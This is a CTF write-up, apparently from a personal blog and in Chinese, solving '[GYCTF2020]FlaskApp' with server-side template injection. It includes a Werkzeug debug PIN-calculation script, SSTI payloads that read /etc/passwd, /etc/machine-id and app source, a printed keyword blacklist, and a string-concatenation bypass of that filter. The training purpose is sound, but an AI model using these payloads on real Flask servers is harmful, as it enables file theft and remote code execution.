---
layout: mypost
title: "[GYCTF2020]FlaskApp"
categories: [ctf_wp]
---

（这题问了好多师傅，大家逐一试后，确实是题目的环境有问题，导致预期解不能解出这题）

（可能这篇文章的讲解是对于有基础的小伙伴，没基础也不要怕，可以先去读完我的另一篇文章---关于 SSTI 模板注入的那点事）

1.首先这个网站就是一个提供了 base64 加密解密功能的一个网站，然后题目以及网站都给了很多的提示，说网站是用的 flask 框架，这个框架出现最多的就是那个 ssti 模板注入，而且查看源码的格式确实是符合模板的这种格式的

2.用{{7\*7}}，{{7+7}}测试一下，前面那个 poc 经过加密解密后返回的是 nonono，一看就是源码有黑名单过滤的，而后面那个 poc 经过加密解密后返回了 14，更加说明我们的思路是没有问题的

![](屏幕截图-2023-09-12-153011-1024x336.png)

![](Screenshot_159-1024x376.png)

这个加密解密真的好烦，要不直接写个脚本或者 bp 爆破一下哪些被过滤了，又测试了几个，但其中一个 poc 不小心让它报错后把报错的内容给展示出来了，而且这个还有一个类似于 shell 的一个小框框，应该是 python 中与系统交互的一个命令行，但是要用这个东西就必须输入 pin 码，现在的工作重心就到了怎么样获取 pin 码上面，然后就开始了一个枯燥的学习过程

![](屏幕截图-2023-09-12-154837-1024x218.png)

![](屏幕截图-2023-09-12-154922.png)

3.简单来说还是要获取到一些文件的内容，网上也有师傅专门去写过 pin 的加密算法以及怎么去利用这个东西，下面给出自己整理的 pin 的生成的要素

```
1. username，用户名
2. modname，默认值为flask.app
3. appname，默认值为Flask
4. moddir，flask库下app.py的绝对路径
5. uuidnode，当前网络的mac地址的十进制数
6. machine_id，docker机器id
```

这个还是很好去理解的，下面也给一个用 python 写的 pin 的加密脚本（这个是 md5 的，还有一个 sha1 的）

```
from itertools import chain
import hashlib
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '134617923377687'# str(uuid.getnode()),  /sys/class/net/eth0/address
    #'1408f836b0ca514d796cbf8960e45fa1'
    'ba5f73903f04e275f7ecc8fd0d7ceb1981ecd9b055cb728def382f52a146a34e', # get_machine_id(),/etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

4.反正总而言之还是要去读文件里面的内容，开始构造 payload，首先{{config}}看看有木有什么有用，没有啥有用的方法（因为之前碰到过一道题就是直接用的 config 里面的方法），因为毕竟是 python 的框架，而在 python 中一切皆对象，而 object 类是 python 中所有类的基类，定义一个类时，没指定继承哪个类，则默认继承 object 类,ssti 大部分都是依靠基类->子类->危险函数来利用，就是说如果获得了 object 这个类，就相当是从根本出发，可以去调用任何想调用的方法，这个就和 linux 的相对路径与绝对路径有着类似之处，但这个题我还是和往常一样，先是查看了一下 object 的所有方法，用到的具体命令如下（如果这个看不懂，可以先去看一下我的博客关于 SSTI 模板注入的那篇文章，或者对 python 有深入理解的，一样可以看的懂，这里唠叨一句哈哈哈哈）

```
{{config.__class__.__init__.__globals__}}
```

然后是真的看到了 os（就是一个方法）

![](屏幕截图-2023-09-12-174121-1024x834.png)

（上图我保证是有 os 的，好像没截全哈哈哈哈）然后接下来就想着构造一个 payload 去读文件去获得上面那些值，然后就可以通过 python 脚本去跑出 pin，下面是具体的 payload

```
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
```

结果发个 nonono，又经过几次测试确定了确实是 os 被过滤了，那就得换思路了，直接从根本出发，直接先得到 object 这个类（这里我就直接给 payload 了，相信大家看完那篇文章一定可以看懂这个 payload，主要这题是加解密绕了一下，不然直接上脚本跑，md，试了好多次才出想要的方法）

这个是第一个 payload

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__}}

上面这个用完就可以得到一堆方法，里面有个open没有被过滤，可以选择用这个去读取一个文件
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
```

这个是第二个 payload

```
{{''.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__}}

上面这个用完也可以得到一堆方法，里面有个open没有被过滤，可以选择用这个去读取一个文件
{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
```

第三个 payload

```
{{[].__class__.__bases__[0].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()}}
```

![](屏幕截图-2023-09-12-180224-1024x804.png)

反正就是想尽一切办法去读取到这个 open 方法就行，然后下面是读取/etc/passwd 的结果

![](屏幕截图-2023-09-12-183240-1024x485.png)

5.然后接下来就是个机械式的操作了，就是不断的读取包含这些内容的文件，然后通过 python 算法得出 pin 的值，然后下面就是读到的一些值

```
1408f836b0ca514d796cbf8960e45fa1 /etc/machine-id
867ab5d2-4e57-4335-811b-2943c662e936 /proc/sys/kernel/random/boot_id
ba5f73903f04e275f7ecc8fd0d7ceb1981ecd9b055cb728def382f52a146a34e /proc/self/cgroup
```

得到的 pin 就是类似于 230-373-677 这种形式，然后我自己可能试了 30 遍吧，把网上公开的加密算法都试了一遍，同时也让师傅们都试了，最后实锤 buuctf 这个题目的环境有问题，这个已经替大家踩雷了，这个问题师傅们不用再困惑了

6.接下来咱们去读它源码，搞事情，当然这个就可能是非预期解了，关键这个题目的作者提示太明显了，就是要用 pin，奈何无法复现了，用下面这个 payload 去读

```
{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__['open']('app.py').read()}}
```

结果如下

```
from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = &#39;s_e_c_r_e_t_k_e_y&#39; bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&#39;BASE64加密&#39;,validators= [DataRequired()]) submit = SubmitField(&#39;提交&#39;) class NameForm1(FlaskForm): text = StringField(&#39;BASE64解密&#39;,validators= [DataRequired()]) submit = SubmitField(&#39;提交&#39;) def waf(str): black_list = [&#34;flag&#34;,&#34;os&#34;,&#34;system&#34;,&#34;popen&#34;,&#34;import&#34;,&#34;eval&#34;,&#34;chr&#34;,&#34;request&#34;, &#34;subprocess&#34;,&#34;commands&#34;,&#34;socket&#34;,&#34;hex&#34;,&#34;base64&#34;,&#34;*&#34;,&#34;?&#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&#39;/hint&#39;,methods=[&#39;GET&#39;]) def hint(): txt = &#34;失败乃成功之母！！&#34; return render_template(&#34;hint.html&#34;,txt = txt) @app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;]) def encode(): if request.values.get(&#39;text&#39;) : text = request.values.get(&#34;text&#34;) text_decode = base64.b64encode(text.encode()) tmp = &#34;结果 :{0}&#34;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#39;encode&#39;)) else : text = &#34;&#34; form = NameForm(text) return render_template(&#34;index.html&#34;,form = form ,method = &#34;加密&#34; ,img = &#34;flask.png&#34;) @app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;]) def decode(): if request.values.get(&#39;text&#39;) : text = request.values.get(&#34;text&#34;) text_decode = base64.b64decode(text.encode()) tmp = &#34;结果 ： {0}&#34;.format(text_decode.decode()) if waf(tmp) : flash(&#34;no no no !!&#34;) return redirect(url_for(&#39;decode&#39;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#39;decode&#39;)) else : text = &#34;&#34; form = NameForm1(text) return render_template(&#34;index.html&#34;,form = form, method = &#34;解密&#34; , img = &#34;flask1.png&#34;) @app.route(&#39;/&lt;name&gt;&#39;,methods=[&#39;GET&#39;]) def not_found(name): return render_template(&#34;404.html&#34;,name = name) if __name__ == &#39;__main__&#39;: app.run(host=&#34;0.0.0.0&#34;, port=5000, debug=True)
```

而关于 waf 的源码如下（这就是被过滤掉的关键词，md 虾仁猪心）

```
def waf(str):
      black_list = [&#34;flag&#34;,&#34;os&#34;,&#34;system&#34;,&#34;popen&#34;,&#34;import&#34;,&#34;eval&#34;,&#34;chr&#34;,&#34;request&#34;, &#34;subprocess&#34;,&#34;commands&#34;,&#34;socket&#34;,&#34;hex&#34;,&#34;base64&#34;,&#34;*&#34;,&#34;?&#34;]
  for x in black_list :
      if x in str.lower() :
      return 1
```

显然它这个过滤是不严谨的哈，直接拼接不就行了嘛，咱们写个 payload 先读一下根目录有什么东西

```
{{[].__class__.__bases__[0].__subclasses__()[102].__init__.__globals__.__builtins__['__imp'+'ort__']('o'+'s').listdir('/')}}
```

![](屏幕截图-2023-09-12-190720-1024x436.png)

这个读到了一个叫做 this_is_the_flag.txt 的的文件，然后直接构造 payload 去读这个文件

```
{{[].__class__.__bases__[0].__subclasses__()[102].__init__.__globals__.__builtins__['open']('/this_is_the_fl'+'ag.txt').read()}}
```

![](屏幕截图-2023-09-12-193019-1024x388.png)

7.最后唠叨一句，可能 python 基础不太好的小白直接看这篇文章还是有很大的疑惑，真的可以先去看一下我的另一篇文章---关于 SSTI 模板注入的那点事，那篇我将会详细讲解原理以及 SSTI 用到的 payload

Finish!!!